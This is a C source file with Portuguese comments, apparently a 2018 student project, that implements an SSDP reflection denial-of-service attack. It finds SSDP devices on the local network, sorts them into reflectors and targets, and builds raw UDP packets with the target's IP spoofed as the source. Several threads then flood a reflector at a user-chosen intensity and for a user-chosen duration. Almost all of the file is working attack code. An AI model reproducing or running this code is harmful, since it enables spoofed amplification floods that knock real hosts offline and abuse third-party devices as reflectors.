
/**
 *  ssdpLib.h
 *  Arquivo responsável por possuir constantes e metodos que realizam
 *  o ataque do protocolo SSDP.
 * 
 *  Autoria: Eduardo Schuabb Duarte
 *  Matricula: 110010876
 *  15/11/2018
*/
#include "ssdpLib.h"


void* multicast_m_search_SSDP(void* arg) { 

	pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
	
    listDispositivoSSDP* listaDispositivos = (listDispositivoSSDP*)arg;
    struct sockaddr_in socket_out, socket_in; 
    int size_socket_in, my_socket;
    char msg_recebida[576];
    char* recved_ip;
    listDispositivoSSDP* dispTemp;

    my_socket = socket(PF_INET, SOCK_DGRAM, 0); 

    socket_out.sin_family = AF_INET; 
    socket_out.sin_port = htons(SSDP_PORT); 

    socket_out.sin_addr.s_addr = inet_addr(SSDP_IP_MULTICAST);

    //printf("Enviando a mensagem:\n");
    //printf(SSDP_MULTICAST_M_SEARCH_MESSAGE);
    //printf("------------------------------------------------------------\n");
    sendto(my_socket, SSDP_MULTICAST_M_SEARCH_MESSAGE, strlen(SSDP_MULTICAST_M_SEARCH_MESSAGE), 0, (struct sockaddr*)&socket_out, sizeof(struct sockaddr_in));
    
    size_socket_in = sizeof(struct sockaddr_in);
    
    //printf("-----------------------Lista---------------------------------\n");
    //mostrarLista(listaDispositivos);
    //printf("-------------------\n");

    printf("MensagemEnviada\n");
    printf("Iniciando loop...\n");
    
    while(1){

        recvfrom(my_socket, msg_recebida, 576, MSG_WAITALL, (struct sockaddr*)&socket_in, &size_socket_in);
        if(verificaSePossuiIP(listaDispositivos, inet_ntoa(socket_in.sin_addr)) == 0){
            
            printf("Obteve novo endereco ip: %s\n", inet_ntoa(socket_in.sin_addr));
            insereDispositivo(listaDispositivos, inet_ntoa(socket_in.sin_addr), STATUS_DISP_REFLETOR, contaBytesMensagem(msg_recebida));
        }
        else{ // nesse caso ja existe esse dispositivo na lista.
            dispTemp = obtemDispPorIP(listaDispositivos, inet_ntoa(socket_in.sin_addr));        
            //printf("\nMensagem recebida, endereco: %s\n", dispTemp->dispositivo->ip);
            dispTemp->dispositivo->quantMsgResposta = dispTemp->dispositivo->quantMsgResposta + 1;
            dispTemp->dispositivo->quantBytesResp = dispTemp->dispositivo->quantBytesResp + contaBytesMensagem(msg_recebida);

        }
    }
    return NULL;
}

void* multicast_escuta_meio_SSDP(void* arg) { 

    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);

    listDispositivoSSDP* listaDispositivos = (listDispositivoSSDP*)arg;
    struct sockaddr_in listen_socket, socket_in; 
    int size_socket_in, my_socket;
    char msg_recebida[576];
    int msg_size;

    //printf("Criando socket\n");
    my_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
    size_socket_in = sizeof(struct sockaddr_in);

    
    u_int yes = 1;
    if( setsockopt(my_socket, SOL_SOCKET, SO_REUSEADDR, (char*) &yes, sizeof(yes)) < 0){
       printf("ERROR ao reutilizar o socket\n");
    }

    memset(&listen_socket, 0, sizeof(listen_socket));
    listen_socket.sin_family = AF_INET;
    listen_socket.sin_port = htons(SSDP_PORT);
    listen_socket.sin_addr.s_addr = htonl(INADDR_ANY);

    //printf("Realizando o bind socket\n");
    if(bind(my_socket,(struct sockaddr*)&listen_socket, sizeof(listen_socket)) < 0){
        printf("ERROR in bind\n");
    }

    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr(SSDP_IP_MULTICAST);
    mreq.imr_interface.s_addr = htonl(INADDR_ANY);

    if( setsockopt(my_socket, IPPROTO_IP, IP_ADD_MEMBERSHIP, (char*) &mreq, sizeof(mreq)) < 0){
        printf("setsockopt\n");
    }

    printf("Escutando o meio...\n");
    while(1){

        msg_size = recvfrom(my_socket, msg_recebida, 576, MSG_WAITALL, (struct sockaddr*)&socket_in, &size_socket_in);

        if(msg_size < 0){
            printf("ERROR in recvfrom\n");
        }
        else{
            //printf("Mensagem recebida:\n %s\n", msg_recebida);
            //printf("--------------------------------------------\n");            

            if(strstr(msg_recebida, "M-SEARCH")){
                //printf("M-SEARCH message\n");
                if(verificaSePossuiIP(listaDispositivos, inet_ntoa(socket_in.sin_addr)) == 0){
            
                    printf("Endereco ip: %s\n", inet_ntoa(socket_in.sin_addr));
                    printf("Nao existe esse endereco ip\n");
                    insereDispositivo(listaDispositivos, inet_ntoa(socket_in.sin_addr), STATUS_DISP_ALVO, contaBytesMensagem(msg_recebida));
                }
            }
            if(strstr(msg_recebida, "NOTIFY")){
                //printf("NOTIFY message\n");
                // Fazer uma logica para identificar possiveis melhores refletores.
                // Quanto mais servicos o dispositivo possui, melhor refletor ele eh.
                // Caso for inserir essa nova informacao. Entao verificar a estrutura de dispositivos.
            }

            //printf("--------------------------------------------\n");
        }
    }
    return NULL;
}

void pesquisarDispositivosSSDP(listDispositivoSSDP* listaDispositivos){

    pthread_t thread_m_search_multicast;

    pthread_create(&thread_m_search_multicast, NULL, multicast_m_search_SSDP, listaDispositivos);
    sleep(5);
	pthread_cancel(thread_m_search_multicast);

    /**
    printf("\n################################\n");
    mostrarDispositivosObtidos(listaDispositivos);
    printf("\n################################\n");
    */

    pthread_create(&thread_m_search_multicast, NULL, multicast_escuta_meio_SSDP, listaDispositivos);
    //sleep(90);  // Verificar por quanto tempo deixo esse sleep.
    sleep(10);
	pthread_cancel(thread_m_search_multicast);
}

pacoteAtaque* montaPacketAttackSSDP(configuracaoAtaque* configuracao){

    printf("Montagem do pacote de ataque...\n");

    char* msgEnvio = malloc(sizeof(SSDP_MULTICAST_M_SEARCH_MESSAGE_part_1) + sizeof(configuracao->dispositivoRefletor->ip) + sizeof(":1900") + sizeof(SSDP_MULTICAST_M_SEARCH_MESSAGE_part_2)); 
    strcpy(msgEnvio, SSDP_MULTICAST_M_SEARCH_MESSAGE_part_1);
    strcat(msgEnvio, configuracao->dispositivoRefletor->ip);
    strcat(msgEnvio, ":1900");
    strcat(msgEnvio, SSDP_MULTICAST_M_SEARCH_MESSAGE_part_2);

   // printf("Mensagem do ataque:\n%s", msgEnvio);    // Aparentemente a montagem do pacote esta OK
                                                    
    /****************************************************************************/
    
    int datagramaSize = contaBytesMensagem(msgEnvio) + (int)sizeof(struct ip) + (int)sizeof(struct udphdr);

    char datagram[datagramaSize], *data;

    memset (datagram, 0, datagramaSize);

    //IP header
    struct ip* iph = (struct ip *) datagram;
    
    // UDP header
    struct udphdr* udph = (struct udphdr *) (datagram + sizeof (struct ip));

    data = datagram + sizeof(struct ip) + sizeof(struct udphdr);
    strcpy(data, msgEnvio);

    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(1900);
    sin.sin_addr.s_addr = inet_addr(configuracao->dispositivoRefletor->ip);
    

    // definindo cabecalho IP.
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(msgEnvio);
    iph->ip_id = htonl(11111);
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0;
    iph->ip_src.s_addr = inet_addr(configuracao->dispositivoAlvo->ip);
    iph->ip_dst.s_addr = sin.sin_addr.s_addr;

    iph->ip_sum = csum((unsigned short*) datagram, iph->ip_len);

    // definindo cabecalho UDP.
    udph->uh_sport = htons(1900);
    udph->uh_dport = htons(1900);
    udph->uh_ulen = htons(8 + strlen(msgEnvio));
    udph->uh_sum = 0;

    printf("Montagem do pacote concluida.\n");

    pacoteAtaque* pktAtaque;

    pktAtaque = criaPacoteAtaque(datagram, datagramaSize, iph, sin);

    //printBytesMemory(pktAtaque->datagrama, pktAtaque->datagramaSize);

    //iniciaAtaqueSSDP(datagram, datagramaSize, intensidadeDoAttack, iph, sin);

    return pktAtaque;
}

configuracaoAtaque* configurarAttackSSDP(listDispositivoSSDP* listaDispositivos){

    /**
     * Configurar o ataque. Como?
     * 1 - Escolher refletores.                                     OK
     * 2 - Escolher alvo.                                           OK
     * 3 - Montar pacote UDP para ataque.                           OK                
     * 4 - Montar configuracao complementar para o ataque:          -
     * 4.1 - Verificar frequencia do envio de pacotes.              VENDO
     * 4.2 - Verificar tamanho do pacote de envio (em bytes).       VENDO
    */

    dispositivoSSDP* dispositivoRefletor = NULL;
    dispositivoSSDP* dispositivoAlvo = NULL;
    configuracaoAtaque* config = NULL;

    int posicaoRefletor, posicaoAlvo, tamanhoDatagrama, tamanhoMsgEnvio;
    int intensidadeDoAttack, tempoAtaque;
    char* datagram;

    dispositivoRefletor = malloc(sizeof(dispositivoSSDP));
    dispositivoAlvo = malloc(sizeof(dispositivoSSDP));
    

    printf("Modulo de configuracao do ataque.\n");
    printf("A rede em que este computador esta conectado, possui os seguintes dispositivos: \n\n");
    mostrarDispositivosObtidos(listaDispositivos);
    
    printf("\n#######################################################################\n");

    if(contaRefletores(listaDispositivos) == 0){
        printf("ATENCAO - Nao exite dispositivos refletores na rede.\n\n");

    }
    if(contaRefletores(listaDispositivos) == 1){
        printf("ATENCAO - Existe apenas um dispositivo refletor na rede.\n\n");
        mostrarRefletores(listaDispositivos);
        dispositivoRefletor = obtemDispPorPosicao(listaDispositivos, 1);
    }
    /**if(contaRefletores(listaDispositivos) > 1){
        printf("\nOs dispositivos refletores sao: \n\n");
        mostrarRefletores(listaDispositivos);
        printf("Escolha um dispositivo indicando a posicao dele na lista: ");
        scanf("%d", &posicaoRefletor);
        dispositivoRefletor = obtemDispPorPosicao(listaDispositivos, posicaoRefletor);
    }*/

    printf("\n#######################################################################\n");
    
    if(contaAlvos(listaDispositivos) == 0){
        printf("ATENCAO - Nao exite dispositivos alvo na rede.\n\n");
        exit(0);

    }
    if(contaAlvos(listaDispositivos) == 1){
        printf("ATENCAO - Existe apenas um dispositivo alvo na rede.\n\n");
        mostrarAlvos(listaDispositivos);
        dispositivoAlvo = obtemDispPorPosicao(listaDispositivos, 2);
    }
    if(contaAlvos(listaDispositivos) > 1){
        printf("\nOs possiveis dispositivos alvo sao: \n\n");
        mostrarAlvos(listaDispositivos);
        printf("Escolha um dispositivo indicando a posicao dele na lista: ");
        scanf("%d", &posicaoAlvo);
        dispositivoAlvo = obtemDispPorPosicao(listaDispositivos, posicaoAlvo);
    }

    printf("\n#######################################################################\n");

    printf("Informe a intensidade do ataque. Intensidade deve ser de 1 a 10:\n");
    printf("Caso queira realizar um ataque incremental, informe 0.\n");
    scanf("%d", &intensidadeDoAttack);

    printf("Informe o tempo do ataque em segundos:\n");
    scanf("%d", &tempoAtaque);


    config = criaConfigAtaque(dispositivoRefletor, dispositivoAlvo, intensidadeDoAttack, tempoAtaque);

    return config;
}

int criandoRawSocketUDP(){

	int rawSocket;
	rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(rawSocket < 0){
		perror("Erro na criacao do raw socket.");
		exit(-1);
	}

    int on = 1;
    if( setsockopt(rawSocket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
        printf("[-] Error! Cannot set IP_HDRINCL");
    }
    if( setsockopt(rawSocket, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) < 0 ){
		printf("setsockopt:sock: ");
	}

	return rawSocket;	
}

unsigned short csum(unsigned short *buf, int nwords){

        unsigned long sum;
        for(sum=0; nwords > 0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}

void printBytesMemory(char *bytes_array, int quantTotalBytes){

	int contador = 0;

	printf("\n");

	while(contador < quantTotalBytes){

		printf("%02X ", (unsigned)bytes_array[contador]);
		contador++;
	}
	printf("\n\n");
}

int contaBytesMensagem(char *vetorChar){

    int contador = 0;
    while(vetorChar[contador] != '\0'){
        contador++;
    }
    return contador;
}

void printPacote(pacoteAtaque* pckAtaque){

    printBytesMemory(pckAtaque->datagrama, pckAtaque->datagramaSize);
    printf("Tamanho datagrama: %d\n", pckAtaque->datagramaSize);
    printf("Tamanho do iph->ip_len: %d\n", pckAtaque->iph->ip_len);
}

void* realizaAtaque(void* arg){
   
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    
    int retorno;

    pacoteThread* pckThread = (pacoteThread*)arg;
    int quantMaxPacotes = pow(10, (pckThread->config->intensidadeDoAttack - 1));
    float tempoEsperaPorPacote = pckThread->quantThreads*(pow(10,6)/quantMaxPacotes);

    while(1){
        
        retorno = sendto(pckThread->sck, pckThread->pckAttack->datagrama, (size_t)(pckThread->pckAttack->datagramaSize), 0, (struct sockaddr*) &(pckThread->pckAttack->sin), sizeof(pckThread->pckAttack->sin));
        if ( retorno < 0)
            printf("\n\nErro ao enviar a mensagem. Erro: %d\n", retorno);
        usleep(tempoEsperaPorPacote); // sleep for 0.1 second.
        //sleep(1.0/quantMaxPacotes);
        //sleep(0.1);
        pckThread->quantPacotesEnviados = pckThread->quantPacotesEnviados + 1;
    }
    
}

//int iniciaAtaqueSSDP(char* datagram, int datagramaSize, int intensidadeDoAttack, struct ip* iph, struct sockaddr_in sin, int tempoAtaque)
int iniciaAtaqueSSDP(configuracaoAtaque* configuracao, pacoteAtaque* pckAttack, int quantThreads) { 

    printf("Iniciando ataque SSDP\n");
    //printf("\n--------------------------------------------------------\n");
    //printBytesMemory(datagram, datagramaSize);

    pacoteThread** pckThread;
    pckThread = (pacoteThread**)malloc(sizeof(pacoteThread*)*quantThreads);

    int nthread;
    int scks[quantThreads];
    pthread_t threadsAttack[quantThreads];
    int quantMaxPacotes = pow(10, (configuracao->intensidadeDoAttack - 1));
    int quantTotalPacotesEnviados = 0;

    // -------------------------------------------------------------------------------------
    pthread_attr_t tattr;
    struct sched_param param;
    int ret;
    ret = pthread_attr_init(&tattr);
    ret = pthread_attr_getschedparam (&tattr, &param);
    param.sched_priority = 1;  // definindo nova prioridade.
    ret = pthread_attr_setschedparam (&tattr, &param);
    // -------------------------------------------------------------------------------------

       

    for(nthread = 0; nthread < quantThreads; nthread++ ){
        scks[nthread] = criandoRawSocketUDP();
        pckThread[nthread] = criaPacoteThread(pckAttack, configuracao, scks[nthread], quantThreads);
    }

    /**
    for(nthread = 0; nthread < quantThreads; nthread++ ){
     
        printf("pckThread[nthread]->sck: %d\n", pckThread[nthread]->sck);
        printf("pckThread[nthread]->pktAttack->datagramaSize: %d\n", pckThread[nthread]->pktAttack->datagramaSize);
        printBytesMemory(pckThread[nthread]->pktAttack->datagrama, pckThread[nthread]->pktAttack->datagramaSize);
    }
    */

    switch(configuracao->intensidadeDoAttack){

        case 0:
        // realizar um ataque incremental.
            break;
        case 1:
        // realizar um ataque de escala 1 = objetivo (maximo 10mb/s minimo 0mb/s)
            break;
        case 2:
        // realizar um ataque de escala 2 = objetivo (maximo 15mb/s minimo 10mb/s)
            break;
        case 3:
        // realizar um ataque de escala 3 = objetivo (maximo 20mb/s minimo 15mb/s)
            break;
        case 4:
        // realizar um ataque de escala 4 = objetivo (maximo 30mb/s minimo 20mb/s)
            break;
        case 5:
        // realizar um ataque de escala 5 = objetivo (maximo 40mb/s minimo 30mb/s)
            break;
        case 6:
        // realizar um ataque de escala 6 = objetivo (maximo 50mb/s minimo 40mb/s)
            break;
        case 7:
        // realizar um ataque de escala 7 = objetivo (maximo 60mb/s minimo 50mb/s)
            break;
        case 8:
        // realizar um ataque de escala 8 = objetivo (maximo 70mb/s minimo 60mb/s)
            break;
        case 9:
        // realizar um ataque de escala 9 = objetivo (maximo 80mb/s minimo 70mb/s)
            break;
        case 10:
        // realizar um ataque de escala 10 = objetivo eh atingir 100mb/s (minimo 80mb/s)
            break;
    }


    for( nthread = 0; nthread < quantThreads; nthread++ ){
    
        printf("\n-----------------------Criando thread----------------------\n");
        //printPacote(pacotesAtaque[nthread]);
        //pthread_create(&threadsAttack[nthread], &tattr, realizaAtaque, pckThread[nthread]);
        pthread_create(&threadsAttack[nthread], NULL, realizaAtaque, pckThread[nthread]);
    }
    sleep(configuracao->tempoAtaque);
    for( nthread = 0; nthread < quantThreads; nthread++ ){
        pthread_cancel(threadsAttack[nthread]);
    }


    printf("Quantidade maxima de pacotes por segundo: %d\n", quantMaxPacotes);
    printf("Quantidade de tempo do ataque em segundos: %d\n", configuracao->tempoAtaque);
    printf("Quantidade maxima de pacotes que devem ser enviados: %d\n", quantMaxPacotes*configuracao->tempoAtaque);
    printf("Tempo de espera para envio de cada pacote: %f\n", 1.0/quantMaxPacotes);
    printf("Quantidade de threads realizando o ataque: %d\n", quantThreads);

    for( nthread = 0; nthread < quantThreads; nthread++ ){
        //printf("Quantidade maxima de pacotes enviados pela thread %d: %d\n", nthread, pckThread[nthread]->quantPacotesEnviados);
        quantTotalPacotesEnviados = quantTotalPacotesEnviados + pckThread[nthread]->quantPacotesEnviados;
    }
    printf("Quantidade maxima de pacotes enviados no ataque: %d\n", quantTotalPacotesEnviados);

    return 1;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------
// Funcoes para criacao das estruturas ao final de cada fase.

pacoteAtaque* criaPacoteAtaque(char* datagrama, int datagramaSize, struct ip* iph, struct sockaddr_in sin){

    pacoteAtaque* novoPacote;
    novoPacote = malloc(sizeof(pacoteAtaque));

    novoPacote->datagramaSize = datagramaSize;
    novoPacote->datagrama = (char*)malloc(sizeof(char)*datagramaSize);
    memcpy(novoPacote->datagrama, datagrama, datagramaSize);
    
    novoPacote->iph = iph;
    novoPacote->sin = sin;

    return novoPacote;
}

configuracaoAtaque* criaConfigAtaque(dispositivoSSDP* dispositivoRefletor, dispositivoSSDP* dispositivoAlvo, int intensidadeDoAttack, int tempoAtaque){

    configuracaoAtaque* novaConfiguracao;
    novaConfiguracao = malloc(sizeof(configuracaoAtaque));

    novaConfiguracao->dispositivoAlvo = dispositivoAlvo;
    novaConfiguracao->dispositivoRefletor = dispositivoRefletor;
    novaConfiguracao->intensidadeDoAttack = intensidadeDoAttack;
    novaConfiguracao->tempoAtaque = tempoAtaque;

    return novaConfiguracao;
}

pacoteThread* criaPacoteThread(pacoteAtaque* pckAttack, configuracaoAtaque* config, int sck, int quantThreads){

    pacoteThread* pckThread;
    pckThread = malloc(sizeof(pacoteThread));

    pckThread->config = config;
    pckThread->pckAttack = pckAttack;
    pckThread->sck = sck;
    pckThread->quantThreads = quantThreads;
    pckThread->quantPacotesEnviados = 0; 

    return pckThread;
}